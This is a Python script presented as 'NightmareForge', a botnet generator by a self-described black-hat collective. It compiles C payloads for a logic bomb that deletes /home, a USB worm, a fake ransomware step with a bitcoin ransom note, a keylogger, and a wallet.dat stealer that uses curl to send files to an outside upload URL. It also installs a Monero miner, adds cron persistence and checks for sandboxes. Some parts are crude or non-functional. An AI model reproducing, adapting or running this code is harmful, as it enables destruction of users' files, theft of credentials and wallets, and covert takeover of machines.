#!/usr/bin/env python3
"""
NightmareForge v1.0 - Python Edition
Author: Anonymous Black Hat Collective (Python by @nathan_non12796)
Purpose: Zeus-level botnet generator with logic bombs, worms, ransomware, crypto-mining.
         Custom C payloads compiled on-the-fly. No msfvenom.
Usage:   python3 nightmareforge.py --c2 172.18.103.16:80 --output bot --crypto --ransom --worm
"""

import os
import sys
import time
import random
import argparse
import subprocess
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import requests

# === CONFIG ===
LOG_FILE = "nightmare.log"
MINER_PATH = "/usr/local/bin/xmrig"
AES_KEY = b"deadbeefdeadbeefdeadbeefdeadbeef"  # 32 bytes
AES_IV = b"0123456789abcdef"  # 16 bytes

# === GLOBALS ===
c2 = "127.0.0.1:8080"
output = "bot"
verbose = True
crypto = True
ransom = True
worm = True
exfil_url = ""

def log_message(msg: str):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {msg}"
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")
    if verbose:
        print(line)

def anti_debug():
    if os.getppid() == 1:
        log_message("Anti-debug: Sandbox detected - aborting.")
        sys.exit(1)
    log_message("Anti-debug: Environment clean.")

def encrypt_data(data: bytes) -> bytes:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    padded = pad(data, 16)
    encrypted = cipher.encrypt(padded)
    log_message("Data encrypted.")
    return encrypted

def exfil_data(data: str):
    try:
        encrypted = encrypt_data(data.encode())
        files = {'file': ('data.enc', encrypted)}
        r = requests.post(exfil_url, files=files, timeout=10)
        if r.status_code == 200:
            log_message(f"Exfil success to {exfil_url}")
        else:
            log_message(f"Exfil failed: HTTP {r.status_code}")
    except Exception as e:
        log_message(f"Exfil error: {e}")

def compile_c_payload(source: str, binary_name: str):
    """Compile C source from string to ELF binary"""
    cmd = ["gcc", "-x", "c", "-w", "-o", binary_name, "-"]
    log_message(f"Compiling payload ? {binary_name}")
    result = subprocess.run(
        cmd,
        input=source,
        text=True,
        capture_output=True
    )
    if result.returncode == 0:
        log_message(f"Compiled: {binary_name}")
        if binary_name != output:
            os.rename(binary_name, output)
        os.chmod(output, 0o755)
    else:
        log_message(f"Compile failed: {result.stderr[:100]}")
    return result.returncode == 0

# === PAYLOAD GENERATORS ===

def generate_logic_bomb():
    src = """
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
int main() {
    time_t now = time(NULL);
    if (now > 1767225599) {  // 2025-12-31
        system("rm -rf /home/* 2>/dev/null || echo 'BOOM' > /tmp/destroyed");
    }
    return 0;
}
"""
    compile_c_payload(src, "bomb")
    log_message("Logic bomb deployed.")

def generate_worm():
    src = f"""
#include <stdio.h>
#include <dirent.h>
#include <string.h>
int main() {{
    DIR *d = opendir("/media");
    if (d) {{
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "cp {output} /media/*/{output} 2>/dev/null");
        system(cmd);
        closedir(d);
    }}
    return 0;
}}
"""
    compile_c_payload(src, "worm_tmp")
    log_message("Worm generated.")
    if worm:
        propagate_worm()

def generate_ransomware():
    src = """
#include <stdio.h>
int main() {
    system("find /home -type f \\( -name '*.doc' -o -name '*.pdf' \\) "
           "-exec sh -c 'echo ENCRYPTED > \"$0.locked\"' {} \\;");
    system("echo 'Pay 1 BTC to Kz9GG646N4JTWBeo8tJpR8kXwtm65s6oxKuNYCH7s915auGX6t21
' > /home/RANSOM.txt");
    return 0;
}
"""
    compile_c_payload(src, "ransom_tmp")
    log_message("Ransomware deployed.")
    exfil_data("RANSOMWARE_ACTIVATED")

def generate_keylogger():
    src = """
#include <stdio.h>
#include <termios.h>
#include <unistd.h>
int main() {
    struct termios old, new;
    tcgetattr(0, &old);
    new = old; new.c_lflag &= ~ECHO;
    tcsetattr(0, TCSANOW, &new);
    FILE *f = fopen("/tmp/keys.log", "a");
    char c;
    while (read(0, &c, 1) == 1) {
        if (f) fprintf(f, "%c", c);
    }
    if (f) fclose(f);
    tcsetattr(0, TCSANOW, &old);
    return 0;
}
"""
    compile_c_payload(src, "keylog_tmp")
    log_message("Keylogger deployed.")

def generate_banking_trojan():
    src = f"""
#include <stdio.h>
int main() {{
    system("find ~/.bitcoin -name wallet.dat -exec curl -X POST --data-binary @{{}} {exfil_url} \\;");
    return 0;
}}
"""
    compile_c_payload(src, "bank_tmp")
    log_message("Banking trojan deployed.")

def generate_crypto_miner():
    src = f"""
#include <stdio.h>
int main() {{
    system("{MINER_PATH} --url pool.supportxmr.com:3333 --user 4A1...YOUR_WALLET --pass x -B >/dev/null 2>&1");
    return 0;
}}
"""
    compile_c_payload(src, "miner_tmp")
    log_message("Crypto miner deployed.")

def persist():
    cron_line = f"@reboot root {os.path.abspath(output)}\n"
    try:
        with open("/etc/crontab", "a") as f:
            f.write(cron_line)
        log_message("Persistence: Added to /etc/crontab")
    except PermissionError:
        log_message("Persistence failed: Run as root for /etc/crontab")

def propagate_worm():
    cmd = f"find /media -type d -exec cp {output} {{}}/{output} 2>/dev/null \\;"
    subprocess.run(cmd, shell=True)
    log_message("Worm propagated via USB.")

def polymorph():
    seed = random.randint(1000, 9999)
    random.seed(seed)
    log_message(f"Polymorph: Code mutated (seed={seed})")

def cleanup():
    files_to_remove = [
        LOG_FILE, "bomb.c", "worm.c", "ransom.c",
        "keylog.c", "bank.c", "miner.c"
    ]
    for f in files_to_remove:
        try:
            os.unlink(f)
        except:
            pass
    log_message("Cleanup complete.")

# === MAIN ===
def main():
    global c2, output, verbose, crypto, ransom, worm, exfil_url

    parser = argparse.ArgumentParser(description="NightmareForge v1.0 - Python Botnet Generator")
    parser.add_argument("--c2", default="127.0.0.1:8080", help="C2 server (ip:port)")
    parser.add_argument("--output", default="bot", help="Output binary name")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose mode")
    parser.add_argument("--crypto", action="store_true", help="Enable Monero mining")
    parser.add_argument("--ransom", action="store_true", help="Enable ransomware")
    parser.add_argument("--worm", action="store_true", help="Enable worm propagation")
    args = parser.parse_args()

    c2 = args.c2
    output = args.output
    verbose = args.verbose
    crypto = args.crypto
    ransom = args.ransom
    worm = args.worm
    exfil_url = f"http://172.18.103.16/upload"

    anti_debug()
    log_message("NightmareForge v1.0-Python initialized.")

    if verbose:
        print(f"C2: {c2} | Out: {output} | Crypto: {crypto} | Ransom: {ransom} | Worm: {worm}")

    polymorph()
    generate_logic_bomb()
    if worm:
        generate_worm()
    if ransom:
        generate_ransomware()
    generate_keylogger()
    generate_banking_trojan()
    if crypto:
        generate_crypto_miner()
    persist()

    cleanup()
    log_message(f"Botnet deployed: {output}")
    print(f"Botnet ready: {output}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log_message("Interrupted by user.")
        sys.exit(0)
